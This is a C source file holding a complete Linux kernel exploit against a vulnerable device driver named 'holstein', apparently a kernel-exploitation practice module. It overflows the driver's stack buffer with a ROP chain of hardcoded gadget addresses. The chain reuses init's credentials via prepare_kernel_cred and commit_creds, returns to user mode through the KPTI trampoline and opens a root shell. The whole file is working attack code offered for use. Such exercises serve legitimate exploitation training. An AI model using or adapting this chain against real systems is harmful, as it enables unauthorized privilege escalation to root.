#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

#define pop_rdi_ret 0xffffffff8127bbdc
#define rop_iretq 0xffffffff810202af // found using: objdump -d vmlinux | grep iretq
#define pop_rcx_ret 0xffffffff812ea083
#define swapgs_ret 0xffffffff8160bf7e // Used for context switching between kernel mode and user mode
#define mov_rdi_rax_rep 0xffffffff8160c96b // mov rdi, rax and then mov qword [rdi], [rsi] rcx times. (put 0 in rcx to cancel ;-))
#define find_task_by_vpid 0xffffffff81068d40
#define prepare_kernel_cred 0xffffffff8106e240
#define commit_creds 0xffffffff8106e390
#define rop_kpti_trampoline 0xffffffff81800e26

int global_fd;

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

void open_dev(char *name){
  char devname[100] = "/dev/";
  strcat(devname, name);
  global_fd = open(devname, O_RDWR);
	if (global_fd < 0){
		puts("[!] Failed to open device");
		exit(-1);
	} else {
    puts("[*] Opened device");
    }
}

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

unsigned long shell_addr = (unsigned long)get_shell;

void my_jump(void) { // needed because of stack alignment
    __asm__(
        ".intel_syntax noprefix;"
        "mov rax, shell_addr;"
        "push rax;"
        "ret;"
        ".att_syntax;"
    );
}

unsigned long user_rip = (unsigned long)my_jump;

void overflow() {
    char buf[0x500];
    memset(buf, 'A', 0x408);
    unsigned long *chain = (unsigned long)&buf[0x408];
    *chain++ = pop_rdi_ret; 
    *chain++ = 0x1; // pid of init, running with root privileges
    *chain++ = find_task_by_vpid;
    *chain++ = pop_rcx_ret;
    *chain++ = 0x0 ; // 0 out the counter in the next gadget
    *chain++ = mov_rdi_rax_rep; // put result of find_task_by_vpid into rdi
    *chain++ = prepare_kernel_cred; // return to prepare_kernel_cred
    *chain++ = pop_rcx_ret;
    *chain++ = 0x0 ; // 0 out the counter in the next gadget
    *chain++ = mov_rdi_rax_rep; // put result of prepare_kernel_cred into rdi
    *chain++ = commit_creds; // return to commit_creds
    *chain++ = rop_kpti_trampoline; 
    *chain++ = 0xdeadbeef; // rax
    *chain++ = 0xdeadbeef; // rdi
    *chain++ = (unsigned long)&my_jump; // rip. Use myjump function to align stack before calling system
    *chain++ = user_cs; // cs
    *chain++ = user_rflags; // rpflags
    *chain++ = user_sp; // rsp
    *chain++ = user_ss; // ss

    write(global_fd, buf, (void*)chain - (void*)buf); // since chain has been incremeneted
}

int main() {

  save_state();

  open_dev("holstein");

  overflow();

  close(global_fd);
  puts("[!] end of main");

  return 0;
  }